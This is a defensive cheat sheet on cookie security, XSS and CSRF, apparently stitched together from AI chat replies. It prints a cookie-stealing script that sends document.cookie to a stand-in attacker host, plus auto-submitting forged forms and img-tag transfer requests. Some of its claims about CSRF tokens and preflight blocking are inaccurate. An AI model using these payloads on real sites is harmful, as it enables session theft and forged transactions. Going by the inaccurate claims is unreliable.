### 🍪 **Cookies Cheat Sheet: Usage, Security Risks & Best Practices**

---

## **1️⃣ What Are Cookies?**

Cookies are **small pieces of data** stored in a user's browser by a website. They help track sessions, authentication, and user preferences.

### **🔹 Common Uses of Cookies**

| Use Case                 | Description                                            |
| ------------------------ | ------------------------------------------------------ |
| **Session Management**   | Store login sessions, shopping carts, user preferences |
| **Authentication**       | Maintain user login status (e.g., `sessionID`)         |
| **Personalization**      | Remember dark mode, language settings, etc.            |
| **Tracking & Analytics** | Track user behavior across pages & sites               |

---

## **2️⃣ Types of Cookies**

| Type                   | Description                                     | Persistent? | Accessible by JS? |
| ---------------------- | ----------------------------------------------- | ----------- | ----------------- |
| **Session Cookies**    | Deleted when the browser closes                 | ❌ No       | ✅ Yes            |
| **Persistent Cookies** | Stored for a specific time                      | ✅ Yes      | ✅ Yes            |
| **HttpOnly Cookies**   | Cannot be accessed by JavaScript (prevents XSS) | ✅ Yes      | ❌ No             |
| **Secure Cookies**     | Only sent over HTTPS                            | ✅ Yes      | ✅ Yes            |
| **SameSite Cookies**   | Controls cross-site requests (prevents CSRF)    | ✅ Yes      | ✅ Yes            |

---

## **3️⃣ Cookie Security Risks & How to Prevent Them**

Cookies can be **exploited** if not configured correctly. Below are common **attacks** and **how to prevent them**.

### **🔹 1. Cross-Site Scripting (XSS)** [Read more](#1️⃣-attacker-injects-this-script)

**📌 What is it?**  
An attacker injects malicious JavaScript into a website to steal cookies.

**🚨 Example Attack:**

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**✅ How to Prevent:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

- **`HttpOnly`** → Prevents JavaScript from accessing cookies.
- **`Secure`** → Ensures cookies are only sent over HTTPS.
- **Use Content Security Policy (CSP):**
  ```http
  Content-Security-Policy: script-src 'self'
  ```

---

### **🔹 2. Cross-Site Request Forgery (CSRF)**

**📌 What is it?**  
An attacker tricks the user into making an unwanted request (e.g., transferring money).

**🚨 Example Attack:**

```html
<img src="https://bank.com/transfer?amount=10000&to=attacker" />
```

**✅ How to Prevent:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

- **`SameSite=Lax`** → Blocks cookies from being sent in hidden requests.
- **Use CSRF Tokens in requests.**
- **Verify the request origin (`Referer` header).**

---

### **🔹 3. Session Hijacking**

**📌 What is it?**  
An attacker **steals a session cookie** to impersonate a user.

**🚨 Example Attack:**

- **Man-in-the-Middle (MITM) Attack** → Intercepts cookies over HTTP.

**✅ How to Prevent:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- **Use `Secure`** to enforce HTTPS.
- **Use `SameSite=Strict`** to prevent cross-site cookie use.
- **Rotate session tokens regularly.**

---

### **🔹 4. Cookie Fixation**

**📌 What is it?**  
An attacker **sets a known session ID** before login, so they can hijack the session later.

**🚨 Example Attack:**

1. Attacker sends a **fixed session ID**:
   ```http
   Set-Cookie: session=attackerID
   ```
2. Victim logs in, using the attacker's session.

**✅ How to Prevent:**

- **Regenerate session ID on login.**
- **Set `SameSite=Strict` to prevent session sharing.**

---

## **4️⃣ Best Practices for Secure Cookies**

| Best Practice                              | Why?                                      |
| ------------------------------------------ | ----------------------------------------- |
| **Use `HttpOnly`**                         | Prevents XSS from stealing cookies.       |
| **Use `Secure`**                           | Ensures cookies are sent only over HTTPS. |
| **Use `SameSite=Lax` or `Strict`**         | Prevents CSRF attacks.                    |
| **Rotate Session Tokens**                  | Reduces impact of hijacked sessions.      |
| **Set Expiry (`Max-Age` or `Expires`)**    | Prevents indefinite cookie persistence.   |
| **Do Not Store Sensitive Data in Cookies** | Use JWTs or session storage instead.      |

---

## **5️⃣ Examples: Setting Cookies Securely**

### **🔹 Basic Secure Cookie**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

✅ Protects against **XSS & CSRF attacks**.

---

### **🔹 Cross-Site Authentication (OAuth)**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=None
```

✅ Allows third-party authentication (e.g., Google Login).  
⚠️ **Must use HTTPS**, or the cookie will be blocked.

---

### **🔹 Short-Lived Authentication Cookie**

```http
Set-Cookie: auth_token=jwt123; HttpOnly; Secure; Max-Age=3600; SameSite=Strict
```

✅ Expires after **1 hour**, preventing **long-term session hijacking**.

---

## **6️⃣ When to Use `Lax` vs `Strict` vs `None`**

| SameSite Policy   | When to Use                        | Pros                           | Cons                                       |
| ----------------- | ---------------------------------- | ------------------------------ | ------------------------------------------ |
| **Lax (Default)** | Standard authentication            | Prevents CSRF for most cases   | Allows cookies on **top-level navigation** |
| **Strict**        | High-security apps (e.g., banking) | Blocks all cross-site requests | May break some login flows                 |
| **None**          | OAuth, Cross-Origin APIs           | Allows third-party logins      | Requires `Secure` flag (HTTPS only)        |

---

## **7️⃣ Verifying Your Cookies**

To check how cookies are set, open **DevTools** (`F12` → Application → Storage → Cookies).  
Or, use JavaScript:

```javascript
console.log(document.cookie); // Doesn't show HttpOnly cookies!
```

For backend debugging:

```http
curl -I https://yourwebsite.com
```

---

## **🚀 Final Takeaways**

✅ **Always use `HttpOnly`, `Secure`, and `SameSite=Lax` by default.**  
✅ **Use `SameSite=Strict` for high-security sites like banking.**  
✅ **For OAuth & cross-site cookies, use `SameSite=None; Secure`.**  
✅ **Rotate session tokens and do not store sensitive data in cookies.**

---

### **🔹 What is Cross-Site Scripting (XSS)?**

**XSS (Cross-Site Scripting)** is an attack where an attacker injects **malicious JavaScript** into a website, which is then executed in another user's browser. This can be used to **steal cookies, modify page content, or redirect users**.

---

## **1️⃣ How Does XSS Work?**

📌 **Attackers exploit user input fields or vulnerable web pages to inject JavaScript.**  
📌 **When another user visits the page, the script executes in their browser.**

**Example of a vulnerable webpage:**

```html
<!-- Vulnerable page that displays user input -->
<form action="/submit" method="POST">
  <input type="text" name="username" />
  <button type="submit">Submit</button>
</form>

<!-- Displaying user input without sanitization -->
<p>Welcome, <span id="user"></span>!</p>

<script>
  // Vulnerable code: directly inserting user input into the DOM
  const params = new URLSearchParams(window.location.search);
  document.getElementById("user").innerHTML = params.get("username");
</script>
```

🔴 **Problem:** If an attacker submits:

```html
<script>
  alert("XSS Attack!");
</script>
```

Then, the page would **execute the script**, showing an alert box.

---

## **2️⃣ Types of XSS Attacks**

### **1️⃣ Stored XSS (Persistent)**

- **Malicious script is permanently stored** in a database or comment section.
- Every visitor to the affected page **automatically runs the attacker's script**.

📌 **Example: Attacker posts this comment on a website:**

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

- The script **steals cookies** from every user who views the comment.

✅ **How to Prevent Stored XSS:**

- **Sanitize inputs before storing them.**
- **Use a Content Security Policy (CSP).**

---

### **2️⃣ Reflected XSS (Non-Persistent)**

- The **attack is part of a URL** and executes when a user **clicks a malicious link**.
- No storage required—script runs once when the page loads.

📌 **Example:**  
An attacker tricks a user into clicking:

```html
https://bank.com/profile?name=
<script>
  alert("Hacked!");
</script>
```

If the website **directly inserts `name` into the page**, the script executes.

✅ **How to Prevent Reflected XSS:**

- **Escape user input before displaying it.**
- **Use HTTP-only cookies to protect session data.**
- **Use input validation (reject `<script>` tags).**

---

### **3️⃣ DOM-Based XSS**

- The attack **modifies the page dynamically using JavaScript**, instead of the server injecting malicious content.

📌 **Example:**

```javascript
const params = new URLSearchParams(window.location.search);
document.write(params.get("name")); // Vulnerable
```

If an attacker sends a link:

```html
https://example.com/page?name=
<script>
  alert("Hacked!");
</script>
```

And a victim clicks, **JavaScript will execute in their browser**.

✅ **How to Prevent DOM XSS:**

- **Avoid `innerHTML`, `document.write()`, and `eval()`.**
- **Use `.textContent` instead of `.innerHTML`.**
- **Use CSP to block inline scripts.**

---

## **3️⃣ Real-World Example: XSS Stealing Cookies**

### **1️⃣ Attacker Injects This Script:**

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

### **2️⃣ User Visits the Page, and This Happens:**

1. The **browser executes the script**.
2. **Sends the victim's session cookie** to `attacker.com`.
3. The attacker can **use the stolen cookie to log in as the victim**.

✅ **How to Prevent XSS Cookie Theft:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

- **`HttpOnly`** → Prevents JavaScript from accessing cookies.
- **`Secure`** → Ensures cookies are only sent over HTTPS.

---

## **4️⃣ How to Prevent XSS in Web Applications**

| **Prevention Method**                          | **How It Helps**                                 |
| ---------------------------------------------- | ------------------------------------------------ |
| **Escape user input**                          | Replace `<script>` with `&lt;script&gt;`         |
| **Use HTTP-only cookies**                      | Prevents JavaScript from reading session cookies |
| **Sanitize inputs**                            | Remove dangerous characters from input fields    |
| **Content Security Policy (CSP)**              | Blocks inline scripts & restricts sources        |
| **Use `.textContent` instead of `.innerHTML`** | Prevents direct script injection                 |
| **Validate input data**                        | Reject input containing `<script>` tags          |

---

## **5️⃣ Secure Coding Example (Fixing XSS)**

Instead of:

```javascript
document.getElementById("user").innerHTML = params.get("username");
```

✅ **Use `.textContent` to Prevent XSS:**

```javascript
document.getElementById("user").textContent = params.get("username");
```

---

## **🚀 Final Takeaways**

✅ **XSS is dangerous because it runs JavaScript in the victim's browser.**  
✅ **Never trust user input—sanitize & escape before displaying it.**  
✅ **Use HTTP-only cookies, CSP, and input validation for protection.**

### **🔹 If `SameSite=None` is Required, How is CSRF Prevented?**

When **frontend & backend are hosted separately**, we **cannot** use `SameSite=Strict` to prevent **Cross-Site Request Forgery (CSRF)** attacks. Instead, we use **other security measures**.

---

## **1️⃣ Why Can't `SameSite=Strict` Be Used for CSRF Prevention?**

✅ `SameSite=Strict` blocks CSRF **but also blocks legitimate API requests** from your frontend (`https://frontend.com`) to your backend (`https://api.backend.com`).  
❌ Since your frontend **must** send cookies to the backend, we **must** use `SameSite=None; Secure`.  
❌ **This means CSRF is possible** unless additional security is in place.

---

## **2️⃣ CSRF Prevention Without `SameSite=Strict`**

### ✅ **1. Use CSRF Tokens (Best Practice)**

A **CSRF token** is a **unique secret value** that must be included in every `POST`, `PUT`, or `DELETE` request. The server **rejects requests without a valid token**.

📌 **How It Works:**

1. The backend sends a **CSRF token** in an HTTP-only cookie.
2. The frontend fetches the token and includes it in API requests (`X-CSRF-Token` header).
3. The backend **verifies** the token before processing the request.

### 🔹 **Backend (Express.js) – CSRF Middleware**

```javascript
const csrf = require("csurf");
const cookieParser = require("cookie-parser");

app.use(cookieParser());
app.use(csrf({ cookie: true })); // CSRF protection

app.get("/csrf-token", (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

app.post("/transfer", (req, res) => {
  res.send("Transfer successful!");
});
```

### 🔹 **Frontend (React) – Fetch CSRF Token**

```javascript
async function fetchCSRFToken() {
  const response = await fetch("https://api.backend.com/csrf-token", {
    credentials: "include",
  });
  const data = await response.json();
  return data.csrfToken;
}

async function transferMoney() {
  const csrfToken = await fetchCSRFToken();

  await fetch("https://api.backend.com/transfer", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken, // ✅ Send CSRF token
    },
    body: JSON.stringify({ amount: 10000, to: "attacker" }),
  });
}
```

✅ **Why This Works?**

- **An attacker’s website (`evil.com`) cannot access the CSRF token** (since it’s in an HTTP-only cookie).
- **Without a valid token, the backend rejects the request.**
- The above only works with cors only allowing the frontend else the attacker can also request for a csrf token and get it.

---

### ✅ **2. Check the `Origin` & `Referer` Headers**

Another way to detect CSRF is by checking the **`Origin` or `Referer` header** in incoming requests.

📌 **Example: A valid request should have `Origin: https://frontend.com`.**

### 🔹 **Backend CSRF Check (Express.js)**

```javascript
app.use((req, res, next) => {
  const allowedOrigin = "https://frontend.com";

  const origin = req.get("Origin");
  const referer = req.get("Referer");

  if (
    origin !== allowedOrigin &&
    (!referer || !referer.startsWith(allowedOrigin))
  ) {
    return res.status(403).json({ error: "CSRF detected" });
  }

  next();
});
```

✅ **Why This Works?**

- **Browsers send the `Origin` and `Referer` headers in POST requests**.
- **If the request is from another site (`evil.com`), it is rejected**.

🚨 **But:**

- Some browsers strip `Referer` headers (breaks in some cases).
- Use this **along with CSRF tokens** for better security.

---

### ✅ **3. Require Authentication for Sensitive Actions**

- **Don't allow unauthenticated users** to perform sensitive actions (e.g., money transfers).
- **Use JWTs or OAuth** to ensure only logged-in users can access critical endpoints.

---

### ✅ **4. Use `SameSite=Lax` for Non-Cross-Origin Cookies**

If some actions **don't require cross-origin requests**, you can still use:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

✅ This **blocks CSRF attacks for most requests**, except for cross-origin ones.

---

## **🚀 Final Takeaways**

✅ **If frontend & backend are separate, you must use `SameSite=None; Secure`.**  
✅ **CSRF protection must be handled with CSRF tokens & `Origin` header checks.**  
✅ **Using `SameSite=Lax` for less critical cookies helps reduce CSRF risk.**

# CORS only blocks response from being sent not request this is why you need csrf tokens with non preflighted requests

## Your api endpoint is still hit and the get post etc is executed

You're absolutely right! When your frontend sends a **JSON request (`Content-Type: application/json`)**, the browser will trigger a **CORS preflight request (`OPTIONS` request)** before the actual request is sent. This introduces an additional security layer that can help mitigate CSRF in some cases.

---

## **🔹 Why Preflight Requests Can Help Prevent CSRF**

### **1️⃣ How Preflight Requests Work**

- When making a `POST`, `PUT`, or `DELETE` request **with `Content-Type: application/json`**, the browser first sends an `OPTIONS` request to check if the actual request is allowed.
- Your backend **must respond with the correct CORS headers** (`Access-Control-Allow-Origin` and `Access-Control-Allow-Methods`) before the browser allows the real request to proceed.

### **2️⃣ Why This Helps Against CSRF**

- **Attackers cannot send preflight requests from evil.com**
  - Browsers **automatically block** `OPTIONS` requests if `api.bank.com` does not allow `evil.com` as an origin.
- **If the preflight request is blocked, the actual request is never sent.**
  - This means the attacker cannot force a JSON request from the victim’s browser.

---

## **🔴 But CSRF Is Still Possible in Some Cases**

Even though preflight requests help, **CSRF can still happen in the following cases:**

### **1️⃣ If Your API Supports `application/x-www-form-urlencoded` or `multipart/form-data`**

- **Simple form submissions (`Content-Type: application/x-www-form-urlencoded`) do NOT trigger a preflight request.**
- Attackers can exploit this by sending a forged form submission from `evil.com`:
  ```html
  <form action="https://api.bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="to" value="attacker" />
    <input type="submit" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```
- Since this is a **"simple request"**, the browser **sends cookies** without a preflight request.
- **If your API accepts this format, the CSRF attack will succeed!**

### **2️⃣ If Your API Allows Wildcard CORS (`Access-Control-Allow-Origin: *`)**

- Some APIs **mistakenly allow `Access-Control-Allow-Origin: *`**, which allows any website (including `evil.com`) to send requests.

### **3️⃣ If Your API Supports JSON but Allows GET Requests to Modify Data**

- If your API **allows state-changing actions using `GET` requests**, an attacker could exploit CSRF by embedding an `<img>` tag:
  ```html
  <img src="https://api.bank.com/transfer?amount=10000&to=attacker" />
  ```
- **GET requests never trigger preflight checks**, so the browser sends the request directly.

---

## **✅ Best Practices: How to Fully Prevent CSRF**

### **1️⃣ Use CSRF Tokens (Best Protection)**

Even with preflight protection, it's best to require an **`X-CSRF-Token`** header:

```javascript
await fetch("https://api.bank.com/transfer", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": csrfToken, // ✅ CSRF token required
  },
  body: JSON.stringify({ amount: 10000, to: "receiver" }),
});
```

**Why?** Attackers **cannot read responses due to CORS**, so they **cannot steal the CSRF token**.

---

### **2️⃣ Use `SameSite=Lax` or `SameSite=Strict` for Cookies**

```http
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Lax
```

- This prevents cookies from being sent in **cross-site requests**.

---

### **3️⃣ Reject Non-Preflighted Requests**

- If your API **only accepts `application/json`**, preflight requests will be required.
- Ensure your backend **rejects `application/x-www-form-urlencoded` and `multipart/form-data`** requests.

Example: **Reject "simple" requests in Express.js**

```javascript
app.use((req, res, next) => {
  if (!req.is("application/json")) {
    return res.status(415).send("Unsupported content type");
  }
  next();
});
```

---

## **🔥 Final Takeaway**

- **Preflight requests help**, but they **do not fully prevent CSRF**.
- **CSRF tokens are still needed** unless your cookies use `SameSite=Strict`.
- **Best practice**: Use **both** CSRF tokens **and** `SameSite=Lax` cookies for the best protection.

Would you like help implementing this in your app? 🚀
